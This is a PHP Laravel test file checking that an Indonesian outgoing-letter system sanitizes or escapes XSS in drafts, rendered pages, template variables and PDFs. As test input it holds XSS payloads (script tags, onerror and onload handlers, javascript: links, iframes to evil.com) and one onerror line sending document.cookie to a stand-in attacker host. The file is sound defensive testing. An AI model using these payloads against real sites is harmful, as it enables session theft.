<?php

namespace Tests\Feature;

use App\Domain\Instansi\Models\InstitutionProfile;
use App\Models\KlasifikasiSurat;
use App\Domain\Pengguna\Models\OrgUnit;
use App\Domain\Pengguna\Models\Position;
use App\Domain\SuratKeluar\Actions\GenerateSuratKeluarPdfAction;
use App\Domain\SuratKeluar\Actions\SaveDraftSuratKeluarAction;
use App\Domain\SuratKeluar\Models\SuratKeluar;
use App\Domain\SuratKeluar\Services\TemplateVariableService;
use App\Models\User;
use App\Services\HtmlSanitizer;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Spatie\Permission\Models\Permission;
use Tests\TestCase;

class SuratKeluarXssSanitizationTest extends TestCase
{
    use RefreshDatabase;

    protected User $creator;
    protected KlasifikasiSurat $klasifikasi;
    protected OrgUnit $unit;

    protected function setUp(): void
    {
        parent::setUp();

        InstitutionProfile::query()->delete();
        InstitutionProfile::create([
            'name' => 'Politeknik Negeri Uji XSS',
            'code' => 'PNU',
            'phone' => '021-123456',
            'email' => 'info@uji-xss.ac.id',
            'address' => 'Jl. Keamanan Siber No. 1',
            'is_configured' => true,
        ]);

        $this->unit = OrgUnit::create([
            'name' => 'Jurusan Teknik Informatika',
            'code' => 'JTI',
            'type' => 'academic',
        ]);

        $pos = Position::create([
            'name' => 'Staf Administrasi',
            'org_unit_id' => $this->unit->id,
            'level' => 3,
        ]);

        $this->creator = User::factory()->create([
            'name' => 'Staf TU Pembuat',
            'email' => 'staf.tu@uji-xss.ac.id',
            'position_id' => $pos->id,
        ]);

        Permission::firstOrCreate(['name' => 'surat-keluar.buat', 'guard_name' => 'web']);
        Permission::firstOrCreate(['name' => 'surat-keluar.lihat', 'guard_name' => 'web']);
        $this->creator->givePermissionTo(['surat-keluar.buat', 'surat-keluar.lihat']);

        $this->klasifikasi = KlasifikasiSurat::create([
            'kode_klasifikasi' => 'HM.01.01',
            'nama' => 'Hubungan Masyarakat',
        ]);
    }

    public function test_server_sanitizer_removes_xss_payloads(): void
    {
        $sanitizer = app(HtmlSanitizer::class);

        $payload = <<<HTML
            <p>Aman di awal</p>
            <script>alert('xss1')</script>
            <img src="x" onerror="alert('xss2')">
            <a href="javascript:alert('xss3')">Klik Jahat</a>
            <svg onload="alert('xss4')"><circle cx="10" cy="10" r="5"/></svg>
            <iframe src="http://evil.com"></iframe>
            <div style="position:fixed; top:0; left:0; width:100%; height:100%; behavior:url(x.htc); color:red;">Teks Merah</div>
HTML;

        $clean = $sanitizer->sanitize($payload);

        $this->assertStringNotContainsString('<script>', $clean);
        $this->assertStringNotContainsString('alert(', $clean);
        $this->assertStringNotContainsString('onerror', $clean);
        $this->assertStringNotContainsString('javascript:', $clean);
        $this->assertStringNotContainsString('<svg', $clean);
        $this->assertStringNotContainsString('onload', $clean);
        $this->assertStringNotContainsString('<iframe', $clean);
        $this->assertStringNotContainsString('behavior:', $clean);
        $this->assertStringNotContainsString('position:fixed', $clean);

        // Tag aman tetap ada
        $this->assertStringContainsString('<p>Aman di awal</p>', $clean);
        $this->assertStringContainsString('Klik Jahat', $clean);
        $this->assertStringContainsString('color:#FF0000', $clean);
    }

    public function test_saved_draft_persists_sanitized_content(): void
    {
        $action = app(SaveDraftSuratKeluarAction::class);

        $maliciousIsi = "<p>Pendahuluan</p><script>alert('steal-token')</script><img onerror=\"fetch('http://evil/?'+document.cookie)\" src=invalid>";
        $maliciousPerihal = "Undangan Rapat <script>alert(1)</script>";
        $maliciousTujuan = "Yth. Pimpinan <img onerror=alert(2) src=1>";

        $suratKeluar = $action->execute($this->creator, [
            'klasifikasi_id' => $this->klasifikasi->id,
            'perihal' => $maliciousPerihal,
            'tujuan' => $maliciousTujuan,
            'isi_surat' => $maliciousIsi,
        ]);

        // Verifikasi di database: tag script dan img harus hilang
        $this->assertDatabaseHas('surat_keluar', [
            'id' => $suratKeluar->id,
            'perihal' => 'Undangan Rapat alert(1)',
            'tujuan' => 'Yth. Pimpinan ',
        ]);

        $this->assertStringNotContainsString('<script>', $suratKeluar->perihal);
        $this->assertStringNotContainsString('<img', $suratKeluar->tujuan);
        $this->assertStringNotContainsString('onerror', $suratKeluar->tujuan);
        $this->assertStringNotContainsString('<script>', $suratKeluar->isi_surat);
        $this->assertStringNotContainsString('onerror', $suratKeluar->isi_surat);
        $this->assertStringContainsString('<p>Pendahuluan</p>', $suratKeluar->isi_surat);

        // Verifikasi di versioning
        $version = $suratKeluar->versions()->first();
        $this->assertNotNull($version);
        $this->assertStringNotContainsString('<script>', $version->isi_surat);
        $this->assertStringNotContainsString('onerror', $version->isi_surat);
    }

    public function test_inertia_response_contains_sanitized_isi_surat(): void
    {
        $suratKeluar = SuratKeluar::create([
            'klasifikasi_id' => $this->klasifikasi->id,
            'user_id' => $this->creator->id,
            'org_unit_id' => $this->unit->id,
            'perihal' => 'Uji Respons Inertia',
            'tujuan' => 'Pihak Terkait',
            'isi_surat' => '<p>Uji</p><script>alert("xss")</script><iframe src="evil.org"></iframe>',
            'status' => SuratKeluar::STATUS_DRAF,
        ]);

        $response = $this->actingAs($this->creator)
            ->get(route('surat-keluar.show', $suratKeluar->id));

        $response->assertOk();
        $responseContent = $response->getContent();

        $this->assertStringNotContainsString('<script>alert("xss")</script>', $responseContent);
        $this->assertStringNotContainsString('<iframe', $responseContent);
    }

    public function test_template_variable_service_escapes_contextual_tokens(): void
    {
        $service = app(TemplateVariableService::class);

        $template = "<p>Perihal: {perihal}, Tujuan: {tujuan}, Oleh: {nama_penandatangan}</p>";
        $context = [
            'perihal' => '<script>alert("perihal-xss")</script>',
            'tujuan' => '"><img src=x onerror=alert("tujuan-xss")>',
            'nama_penandatangan' => "Dr. Budi <iframe src='evil.com'></iframe>",
        ];

        $rendered = $service->render($template, $context);

        $this->assertStringNotContainsString('<script>', $rendered);
        $this->assertStringNotContainsString('<img', $rendered);
        $this->assertStringNotContainsString('<iframe', $rendered);
        $this->assertStringContainsString('&lt;script&gt;alert(&quot;perihal-xss&quot;)&lt;/script&gt;', $rendered);
        $this->assertStringContainsString('&quot;&gt;&lt;img src=x onerror=alert(&quot;tujuan-xss&quot;)&gt;', $rendered);
    }

    public function test_pdf_generation_excludes_xss_script_and_iframe(): void
    {
        $suratKeluar = SuratKeluar::create([
            'klasifikasi_id' => $this->klasifikasi->id,
            'user_id' => $this->creator->id,
            'org_unit_id' => $this->unit->id,
            'perihal' => 'Surat Bebas XSS',
            'tujuan' => 'Seluruh Sivitas',
            'isi_surat' => '<p>Konten PDF Aman</p><script>alert("pdf-xss")</script><iframe src="evil.com"></iframe>',
            'status' => SuratKeluar::STATUS_DRAF,
        ]);

        $result = app(GenerateSuratKeluarPdfAction::class)->execute($suratKeluar);
        $pdfBinary = $result['pdf_binary'];

        $this->assertStringStartsWith('%PDF-', $pdfBinary);
        $this->assertStringNotContainsString('<script>alert("pdf-xss")</script>', $pdfBinary);
        $this->assertStringNotContainsString('<iframe src="evil.com">', $pdfBinary);
    }
}
